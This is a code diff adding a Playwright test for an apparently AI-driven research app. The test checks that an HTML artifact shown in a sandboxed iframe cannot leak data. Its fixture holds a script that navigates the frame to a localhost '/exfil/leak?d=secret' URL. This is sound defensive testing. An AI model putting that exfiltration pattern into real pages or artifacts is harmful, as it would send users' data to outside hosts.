@@ -264,3 +264,34 @@ test.describe('new research', () => {
     await expect(page.getByText(/Research complete/).first()).toBeVisible({ timeout: 40_000 });
   });
 });
+
+test.describe('artifact frame navigation', () => {
+  test('REVIEW (final): an artifact cannot make its frame send a request to another page', async ({ page }) => {
+    const id = '33333333-3333-4333-8333-333333333333';
+    // The artifact tries to leak data by navigating its own frame. What matters is that no request is sent.
+    const html =
+      '<!doctype html><html><body><p id="marker">STILL HERE</p>' +
+      '<script>setTimeout(function(){ location.href = "http://localhost:3100/exfil/leak?d=secret"; }, 300);</script></body></html>';
+    const events = [
+      { runId: id, seq: 1, ts: 1, type: 'run_started', prompt: 'frame navigation' },
+      { runId: id, seq: 2, ts: 2, type: 'report_done', text: '# R\n\nBody.' },
+      { runId: id, seq: 3, ts: 3, type: 'artifact_started' },
+      { runId: id, seq: 4, ts: 4, type: 'artifact_done', html },
+      { runId: id, seq: 5, ts: 5, type: 'run_finished', costUsd: 0 },
+    ];
+    const leaked: string[] = [];
+    await page.route('**/exfil/**', (route) => {
+      leaked.push(route.request().url());
+      return route.fulfill({ status: 200, contentType: 'text/html', body: 'leaked' });
+    });
+    await page.route(`**/api/run/${id}*`, (route) =>
+      route.fulfill({ json: { run: { id, prompt: 'frame navigation', status: 'finished' }, events, active: false } }),
+    );
+    await page.goto(`/run/${id}`);
+    const canvas = page.getByRole('complementary', { name: 'Report canvas' });
+    await canvas.getByRole('tab', { name: /Interactive view/ }).click();
+    await expect(page.frameLocator('iframe[title="Interactive view"]').locator('#marker')).toHaveText('STILL HERE');
+    await page.waitForTimeout(1500); // long enough for the navigation attempt to have happened
+    expect(leaked).toEqual([]);
+  });
+});
